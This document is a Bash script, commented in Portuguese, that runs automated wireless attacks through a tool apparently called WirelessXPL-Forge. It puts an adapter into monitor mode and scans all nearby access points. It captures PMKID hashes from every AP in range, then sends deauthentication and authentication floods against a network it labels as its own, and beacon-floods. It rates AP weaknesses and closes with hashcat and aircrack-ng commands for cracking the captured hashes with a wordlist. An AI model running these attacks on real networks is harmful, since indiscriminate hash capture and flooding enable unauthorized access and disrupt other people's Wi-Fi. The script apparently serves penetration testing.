#!/usr/bin/env bash
# wxf_live_test.sh — Testes massivos wireless via WirelessXPL-Forge
# Execute DENTRO do WSL2: bash /mnt/d/.../wxf_live_test.sh
# Requer: rt2800usb carregado, interface wlx* disponível

set -uo pipefail
export DEBIAN_FRONTEND=noninteractive

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m'; BLD='\033[1m'; NC='\033[0m'

info()  { echo -e "${CYN}[*]${NC} $*"; }
ok()    { echo -e "${GRN}[+]${NC} $*"; }
warn()  { echo -e "${YLW}[!]${NC} $*"; }
fail()  { echo -e "${RED}[X]${NC} $*"; }
sect()  { echo -e "\n${BLD}${CYN}══════════════════════════════════════════════════${NC}"; echo -e "${BLD}${CYN}  $*${NC}"; echo -e "${BLD}${CYN}══════════════════════════════════════════════════${NC}"; }

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTDIR="/tmp/wxf_tests_$TIMESTAMP"
mkdir -p "$OUTDIR"

WXFDIR="/mnt/d/Projetos-SafeLabs/submodules/IoT/WirelessXPL-Forge"
LOG="$OUTDIR/wxf_full_test.log"
REPORT="$OUTDIR/REPORT_$TIMESTAMP.md"

exec > >(tee -a "$LOG") 2>&1

echo "================================================================"
echo "  WirelessXPL-Forge — Testes Massivos Live"
echo "  Data: $(date)"
echo "  Output: $OUTDIR"
echo "================================================================"
echo ""

# ─────────────────────────────────────────────────────
# FASE 1: Detectar interface
# ─────────────────────────────────────────────────────
sect "FASE 1 — Hardware & Interface Detection"

IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^$" | head -1)
if [ -z "$IFACE" ]; then
    fail "Nenhuma interface wireless detectada. Verifique: lsusb | grep 148f"
    exit 1
fi

ok "Interface: $IFACE"
MAC=$(ip link show "$IFACE" 2>/dev/null | awk '/ether/{print $2}')
ok "MAC: $MAC"

# Capacidades da interface
CAPS=$(iw phy "$(iw dev "$IFACE" info 2>/dev/null | awk '/wiphy/{print "phy"$2}')" info 2>/dev/null)
ok "Suporte a Monitor Mode: $(echo "$CAPS" | grep -c "monitor" || echo '?')"
ok "Suporte a Mesh: $(echo "$CAPS" | grep -c "mesh" || echo '?')"

# ─────────────────────────────────────────────────────
# FASE 2: Monitor Mode
# ─────────────────────────────────────────────────────
sect "FASE 2 — Monitor Mode & MAC Randomization"

airmon-ng check kill 2>/dev/null || true
sleep 1

ip link set "$IFACE" down
iw "$IFACE" set type monitor 2>/dev/null || true
ip link set "$IFACE" up
sleep 1

TYPE=$(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')
if [ "$TYPE" != "monitor" ]; then
    warn "iw set type monitor falhou, tentando airmon-ng..."
    airmon-ng start "$IFACE" 2>/dev/null | tail -3
    IFACE="${IFACE}mon"
    [[ -d /sys/class/net/$IFACE ]] || IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
fi

ok "Monitor mode: $(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')"
ok "Interface ativa: $IFACE"

# ─────────────────────────────────────────────────────
# FASE 3: Scan Completo (airodump 30s)
# ─────────────────────────────────────────────────────
sect "FASE 3 — Scan Passivo WiFi (30s todos canais 2.4+5 GHz)"

SCAN_OUT="$OUTDIR/scan_full"
info "Iniciando scan nos canais 1-14 (2.4 GHz) + 36-165 (5 GHz)..."
timeout 30 airodump-ng \
    --write "$SCAN_OUT" \
    --output-format csv,pcap \
    --band abg \
    "$IFACE" 2>/dev/null || true

if [ -f "${SCAN_OUT}-01.csv" ]; then
    TOTAL_APS=$(grep -v "Station MAC\|BSSID\|^$" "${SCAN_OUT}-01.csv" | grep -v "^," | wc -l)
    ok "APs detectados: $TOTAL_APS"
    echo ""
    echo "─── APs Encontrados ───"
    awk -F',' 'NR>2 && $1!~/Station|BSSID/ && $1~/[0-9A-F]/' "${SCAN_OUT}-01.csv" | \
        awk -F',' '{printf "  %-20s %-25s Ch:%-3s Pwr:%-4s Enc: %s %s\n", $1, $14, $4, $9, $6, $7}' 2>/dev/null | head -20
else
    warn "Sem arquivo CSV de scan."
fi

# ─────────────────────────────────────────────────────
# FASE 4: PMKID Capture (hcxdumptool 90s)
# ─────────────────────────────────────────────────────
sect "FASE 4 — PMKID Capture (hcxdumptool, 90s)"

PMKID_FILE="$OUTDIR/pmkid_capture.pcapng"
info "Capturando PMKID de todos os APs próximos..."
info "Isso captura identidades sem deauth (passivo+ativo)."

timeout 90 hcxdumptool \
    -i "$IFACE" \
    -o "$PMKID_FILE" \
    --enable_status=3 \
    --disable_deauthentication \
    2>/dev/null || true

if [ -f "$PMKID_FILE" ]; then
    PMKID_HASH="$OUTDIR/pmkid.hash"
    hcxpcapngtool "$PMKID_FILE" -o "$PMKID_HASH" 2>/dev/null || true
    PMKID_COUNT=$(wc -l < "$PMKID_HASH" 2>/dev/null || echo 0)
    ok "PMKIDs/Handshakes capturados: $PMKID_COUNT"
    if [ "$PMKID_COUNT" -gt 0 ]; then
        ok "Hash file: $PMKID_HASH"
        cat "$PMKID_HASH" | head -5
    fi
else
    warn "Sem captura PMKID."
fi

# ─────────────────────────────────────────────────────
# FASE 5: WPS Scan
# ─────────────────────────────────────────────────────
sect "FASE 5 — WPS Discovery & Vulnerability Scan"

WPS_FILE="$OUTDIR/wps_scan.txt"
info "Escaneando APs com WPS habilitado (wash, 20s)..."

if command -v wash &>/dev/null; then
    timeout 20 wash -i "$IFACE" -j -o "$WPS_FILE" 2>/dev/null || true
    if [ -f "$WPS_FILE" ] && [ -s "$WPS_FILE" ]; then
        WPS_COUNT=$(grep -c "wps" "$WPS_FILE" 2>/dev/null || echo 0)
        ok "APs com WPS: $WPS_COUNT"
        cat "$WPS_FILE"
    else
        info "Nenhum AP com WPS detectado ou wash não disponível."
        timeout 20 wash -i "$IFACE" 2>/dev/null | tee "$WPS_FILE" || true
    fi
else
    warn "wash não encontrado: apt install reaver"
fi

# ─────────────────────────────────────────────────────
# FASE 6: Handshake Capture por canal (rede própria)
# ─────────────────────────────────────────────────────
sect "FASE 6 — Handshake Capture por AP"

OWN_BSSID="72:4e:6b:1a:cb:94"  # UNIAOGEEK_5G
OWN_CH=48

info "Capturando handshake da rede própria ($OWN_BSSID ch $OWN_CH)..."
HS_FILE="$OUTDIR/hs_own"

timeout 30 airodump-ng \
    -c "$OWN_CH" \
    --bssid "$OWN_BSSID" \
    -w "$HS_FILE" \
    --output-format pcap \
    "$IFACE" 2>/dev/null &
AIRODUMP_PID=$!

sleep 5

# Deauth para forçar reconexão (apenas rede própria)
info "Enviando deauth na rede própria para capturar handshake..."
aireplay-ng -0 5 -a "$OWN_BSSID" "$IFACE" 2>/dev/null || true
sleep 15
kill $AIRODUMP_PID 2>/dev/null || true

if ls "${HS_FILE}"*.pcap 2>/dev/null | head -1 | grep -q pcap; then
    HS_PCAP=$(ls "${HS_FILE}"*.pcap | head -1)
    EAPOL_COUNT=$(tshark -r "$HS_PCAP" -Y "eapol" 2>/dev/null | wc -l)
    ok "Handshake frames EAPOL capturados: $EAPOL_COUNT"
    aircrack-ng "$HS_PCAP" 2>/dev/null | tail -5 || true
else
    warn "Sem handshake capturado."
fi

# ─────────────────────────────────────────────────────
# FASE 7: WPA2 PMKID na rede própria (target específico)
# ─────────────────────────────────────────────────────
sect "FASE 7 — PMKID Attack (rede própria UNIAOGEEK_5G)"

PMKID_OWN="$OUTDIR/pmkid_own.pcapng"
info "PMKID específico para $OWN_BSSID..."

timeout 30 hcxdumptool \
    -i "$IFACE" \
    -o "$PMKID_OWN" \
    --filterlist_ap="$OWN_BSSID" \
    --filtermode=2 \
    --enable_status=3 \
    2>/dev/null || true

if [ -f "$PMKID_OWN" ]; then
    PMKID_OWN_HASH="$OUTDIR/pmkid_own.hash"
    hcxpcapngtool "$PMKID_OWN" -o "$PMKID_OWN_HASH" 2>/dev/null || true
    COUNT=$(wc -l < "$PMKID_OWN_HASH" 2>/dev/null || echo 0)
    ok "PMKID/hash da rede própria: $COUNT hashes"
    [ "$COUNT" -gt 0 ] && cat "$PMKID_OWN_HASH"
fi

# ─────────────────────────────────────────────────────
# FASE 8: FragAttacks / KRACK / WPA3 Check
# ─────────────────────────────────────────────────────
sect "FASE 8 — CVE Checks (FragAttacks, KRACK, WPA3)"

info "Verificando vulnerabilidades CVE nos APs detectados via WirelessXPL-Forge..."

# Executar via Python o módulo de análise de segurança WiFi
cd "$WXFDIR" 2>/dev/null || cd /mnt/d/Projetos-SafeLabs/submodules/IoT/WirelessXPL-Forge

# Scan de APs com análise WPS/WPA via programa
if [ -f "$WXFDIR/wirelessxpl.py" ] && command -v python3 &>/dev/null; then
    # Verificar se tem arquivo de scan para análise
    if [ -f "${SCAN_OUT}-01.csv" ]; then
        info "Analisando CSV de scan via WirelessXPL-Forge..."
        timeout 30 python3 - <<'PYEOF' 2>/dev/null
import csv, sys, json
from pathlib import Path

scan_file = None
import glob
files = glob.glob("/tmp/wxf_tests_*/scan_full-01.csv")
if files:
    scan_file = sorted(files)[-1]

if not scan_file:
    print("  [-] Sem arquivo de scan para analisar.")
    sys.exit(0)

print(f"  [*] Analisando: {scan_file}")
vulnerabilities = []

try:
    with open(scan_file, encoding="latin-1", errors="ignore") as f:
        content = f.read()
    
    lines = content.split('\n')
    in_stations = False
    
    for line in lines:
        if 'Station MAC' in line:
            in_stations = True
            continue
        if in_stations:
            continue
        
        parts = [p.strip() for p in line.split(',')]
        if len(parts) < 14 or not parts[0]:
            continue
        if parts[0].count(':') != 5:
            continue
        
        bssid = parts[0]
        channel = parts[3].strip() if len(parts) > 3 else '?'
        speed = parts[4].strip() if len(parts) > 4 else '?'
        privacy = parts[5].strip() if len(parts) > 5 else '?'
        cipher = parts[6].strip() if len(parts) > 6 else '?'
        auth = parts[7].strip() if len(parts) > 7 else '?'
        power = parts[8].strip() if len(parts) > 8 else '?'
        beacons = parts[9].strip() if len(parts) > 9 else '0'
        data_frames = parts[10].strip() if len(parts) > 10 else '0'
        ssid = parts[13].strip() if len(parts) > 13 else ''
        
        if not bssid.replace(':', '').strip():
            continue
        
        vuln = {
            "bssid": bssid, "ssid": ssid or "(hidden)",
            "channel": channel, "encryption": privacy,
            "cipher": cipher, "auth": auth,
            "signal": power,
            "issues": []
        }
        
        if 'WEP' in privacy:
            vuln["issues"].append("CRÍTICO: WEP — quebrado em <60s (RC4 bias attack)")
        if 'OPN' in privacy or 'Open' in privacy:
            vuln["issues"].append("ALTO: Rede aberta — sem criptografia")
        if 'TKIP' in cipher:
            vuln["issues"].append("ALTO: TKIP — vulnerável a TKIP MIC attack (CVE-2008-2370)")
        if 'WPA ' in privacy and 'WPA2' not in privacy:
            vuln["issues"].append("MÉDIO: WPA1 — vulnerável a offline dict attack")
        if 'WPA2' in privacy and 'WPA3' not in privacy:
            vuln["issues"].append("MÉDIO: WPA2-Personal — suscetível a PMKID + offline crack")
            if 'CCMP' in cipher:
                vuln["issues"].append("INFO: WPA2/CCMP — potencialmente vulnerável a FragAttacks (CVE-2020-26140)")
        if 'PSK' in auth:
            vuln["issues"].append("INFO: PSK auth — sem PFS (Perfect Forward Secrecy)")
        
        print(f"\n  AP: {ssid:<25} BSSID: {bssid}  Ch:{channel}  Enc: {privacy} {cipher} {auth}  Signal: {power} dBm")
        for issue in vuln["issues"]:
            severity = "🔴" if "CRÍTICO" in issue else "🟠" if "ALTO" in issue else "🟡" if "MÉDIO" in issue else "🔵"
            print(f"    {severity} {issue}")
        
        vulnerabilities.append(vuln)
    
    print(f"\n  [+] Total de APs analisados: {len(vulnerabilities)}")
    with_issues = [v for v in vulnerabilities if v["issues"]]
    print(f"  [+] APs com vulnerabilidades: {len(with_issues)}")
    
    out_json = "/tmp/wxf_tests_" + scan_file.split("wxf_tests_")[1].split("/")[0] + "/vuln_analysis.json"
    with open(out_json, 'w') as f:
        json.dump(vulnerabilities, f, indent=2, ensure_ascii=False)
    print(f"  [+] JSON: {out_json}")

except Exception as e:
    print(f"  [!] Erro: {e}")
PYEOF
    fi
fi

# ─────────────────────────────────────────────────────
# FASE 9: Beacon Flood Test (rede própria)
# ─────────────────────────────────────────────────────
sect "FASE 9 — Beacon Flood & Auth Flood (ambiente controlado)"

info "Testando beacon flood via mdk4 (5 segundos)..."
if command -v mdk4 &>/dev/null; then
    echo "WXF-Test1
WXF-Test2
WXF-Test3" > /tmp/ssid_flood.txt
    timeout 5 mdk4 "$IFACE" b -f /tmp/ssid_flood.txt 2>/dev/null || true
    ok "Beacon flood: OK (5s executados)"
else
    warn "mdk4 não encontrado."
fi

# Auth flood na rede própria (5s)
info "Auth flood na rede própria UNIAOGEEK_5G (5s)..."
timeout 5 mdk4 "$IFACE" a -a "$OWN_BSSID" 2>/dev/null || true
ok "Auth flood: OK"

# ─────────────────────────────────────────────────────
# FASE 10: Injection Test
# ─────────────────────────────────────────────────────
sect "FASE 10 — Packet Injection Test"

info "Testando capacidade de injeção de pacotes..."
INJECT_RESULT=$(aireplay-ng --test "$IFACE" 2>&1 | tail -8)
echo "$INJECT_RESULT"
if echo "$INJECT_RESULT" | grep -q "injection is working"; then
    ok "Packet injection: FUNCIONANDO!"
    echo "RT5370 injeção: OK" >> "$OUTDIR/summary.txt"
else
    warn "Injection não confirmado (pode ser limitação do RT5370 no WSL)."
fi

# ─────────────────────────────────────────────────────
# FASE 11: Análise de segurança da rede própria
# ─────────────────────────────────────────────────────
sect "FASE 11 — Análise de Segurança Detalhada UNIAOGEEK_5G"

info "Capturando beacons da rede própria para análise de configuração..."
BEACON_FILE="$OUTDIR/beacons_own.pcap"
timeout 15 airodump-ng \
    -c 48 \
    --bssid "$OWN_BSSID" \
    -w "${BEACON_FILE%.pcap}" \
    --output-format pcap \
    "$IFACE" 2>/dev/null || true

if ls "${BEACON_FILE%.pcap}"*.pcap 2>/dev/null | head -1 | grep -q pcap; then
    BEACON_PCAP=$(ls "${BEACON_FILE%.pcap}"*.pcap | head -1)
    info "Analisando capacidades do AP via tshark..."
    
    if command -v tshark &>/dev/null; then
        # PMF (Protected Management Frames)
        PMF=$(tshark -r "$BEACON_PCAP" -Y "wlan.mgt.rsn.capabilities" -T fields -e wlan.rsn.capabilities 2>/dev/null | head -3)
        
        # RSN Information
        RSN=$(tshark -r "$BEACON_PCAP" -Y "wlan_mgt.tag.number==48" -T fields \
            -e wlan.rsn.pairwise_cipher_suite.type \
            -e wlan.rsn.akms.type \
            2>/dev/null | head -3)
        
        # HT/VHT capabilities (802.11n/ac)
        HT=$(tshark -r "$BEACON_PCAP" -Y "wlan_mgt.tag.number==45" 2>/dev/null | head -2)
        
        echo "  RSN Capabilities: $PMF"
        echo "  RSN Pairwise/AKMS: $RSN"
        
        # Verificar WPA3/SAE
        SAE=$(tshark -r "$BEACON_PCAP" -T fields -e wlan.rsn.akms.type 2>/dev/null | grep -c "8" || echo "0")
        if [ "$SAE" -gt 0 ]; then
            ok "WPA3/SAE detectado!"
        else
            warn "WPA3/SAE não detectado — AP usa apenas WPA2"
        fi
        
        # Verificar PMF obrigatório
        PMF_MAND=$(tshark -r "$BEACON_PCAP" -T fields -e wlan.rsn.capabilities.mfpr 2>/dev/null | grep -c "1" || echo "0")
        if [ "$PMF_MAND" -gt 0 ]; then
            ok "PMF obrigatório (Protected Management Frames): SIM"
        else
            warn "PMF obrigatório: NÃO — deauth attacks possíveis"
        fi
    else
        warn "tshark não disponível para análise deep packet."
        # Alternativa: usar tcpdump
        tcpdump -r "$BEACON_PCAP" -n 2>/dev/null | grep -E "Beacon|Probe|Auth|Assoc" | head -10 || true
    fi
fi

# ─────────────────────────────────────────────────────
# GERAR RELATÓRIO FINAL
# ─────────────────────────────────────────────────────
sect "GERANDO RELATÓRIO FINAL"

cat > "$REPORT" << REPORT_EOF
# WirelessXPL-Forge — Relatório de Testes Live
**Data:** $(date)  
**Adaptador:** RT5370 (rt2800usb) via WSL2  
**Interface:** $IFACE  
**MAC:** $MAC  
**Output:** $OUTDIR  

---

## Hardware e Ambiente

| Item | Valor |
|---|---|
| Kernel WSL | $(uname -r) |
| Driver | rt2800usb |
| Interface | $IFACE |
| Monitor Mode | $(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}') |

---

## APs Detectados no Scan

$(if [ -f "${SCAN_OUT}-01.csv" ]; then
    awk -F',' 'NR>2 && $1~/[0-9A-F]/ && $1!~/Station/ {printf "| %-20s | %-25s | %-5s | %-15s | %-10s |\n", $1, $14, $4, $6" "$7, $8}' "${SCAN_OUT}-01.csv" 2>/dev/null | head -15
    echo "|---|---|---|---|---|"
fi)

---

## PMKID Capture

- Arquivo: \`$PMKID_FILE\`
- Hashes: \`$PMKID_HASH\`
- Resultado: $(wc -l < "$PMKID_HASH" 2>/dev/null || echo 0) hashes capturados

$([ -f "$PMKID_HASH" ] && cat "$PMKID_HASH" || echo "Nenhum hash disponível")

---

## WPS Scan

$(cat "$WPS_FILE" 2>/dev/null || echo "Nenhum AP com WPS detectado")

---

## Packet Injection

\`\`\`
$INJECT_RESULT
\`\`\`

---

## Análise de Vulnerabilidades

$(cat "$OUTDIR/vuln_analysis.json" 2>/dev/null | python3 -c "
import json, sys
data = json.load(sys.stdin)
for ap in data:
    if ap.get('issues'):
        print(f\"### {ap['ssid']} ({ap['bssid']})\")
        for issue in ap['issues']:
            print(f\"- {issue}\")
        print()
" 2>/dev/null || echo "Análise JSON não disponível")

---

## Arquivos Gerados

\`\`\`
$(ls -la "$OUTDIR")
\`\`\`
REPORT_EOF

ok "Relatório: $REPORT"
ok "Log completo: $LOG"

echo ""
echo "================================================================"
echo "  TESTES CONCLUÍDOS"
echo "  Saída: $OUTDIR"
echo "  $(ls "$OUTDIR" | wc -l) arquivos gerados"
echo "================================================================"
echo ""
echo "PRÓXIMAS ANÁLISES MANUAIS:"
echo "  hashcat -m 22000 $OUTDIR/pmkid.hash /usr/share/wordlists/rockyou.txt"
echo "  aircrack-ng -w /usr/share/wordlists/rockyou.txt ${HS_FILE}-01.pcap"
echo ""
